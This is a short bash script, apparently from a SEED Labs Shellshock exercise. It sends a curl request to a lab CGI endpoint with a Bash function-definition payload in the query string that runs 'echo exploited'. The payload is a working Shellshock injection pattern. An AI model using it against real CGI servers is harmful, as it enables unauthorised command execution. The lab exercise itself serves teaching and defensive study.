#!/bin/bash

curl "www.seedlab-shellshock.com/cgi-bin/getenv.cgi?'+()+%7B+cat;+%7D;+echo;+echo+exploited'"
